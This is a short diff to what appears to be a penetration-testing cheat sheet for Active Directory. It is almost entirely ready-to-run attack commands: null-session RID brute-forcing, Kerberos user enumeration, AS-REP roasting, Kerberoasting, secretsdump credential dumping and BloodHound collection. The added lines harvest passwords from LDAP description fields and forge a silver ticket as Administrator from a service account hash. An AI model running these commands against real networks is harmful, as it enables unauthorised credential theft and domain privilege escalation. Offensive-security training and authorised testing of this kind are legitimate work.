@@ -231,10 +231,14 @@ sudo nc -lvnp 389
 
 ```bash
 nxc smb $IP -u '' -p '' --rid-brute 10000     # real user list from a null/guest session
+nxc ldap $IP -u <user> -p <pass> -M user-desc  # description/info fields hold reset passwords
 impacket-lookupsid <domain>/guest@$IP 10000   # same idea, via SID walking
 kerbrute userenum -d <domain> --dc $IP users.txt
 impacket-GetNPUsers <domain>/ -no-pass -usersfile users.txt -dc-ip $IP        # AS-REP roast
 impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip $IP -request               # Kerberoast
+# svc account hash -> Administrator on THAT service, no krbtgt/DCSync needed (silver ticket):
+impacket-ticketer -nthash <svc-nt-hash> -domain-sid S-1-5-21-... -domain <dom> -spn MSSQLSvc/sql.<dom>:1433 -user-id 500 Administrator
+export KRB5CCNAME=Administrator.ccache      # then any impacket tool with -k -no-pass
 impacket-secretsdump <domain>/<user>:<pass>@$IP
 bloodhound-python -d <domain> -u <user> -p <pass> -ns $IP -c all
 ```
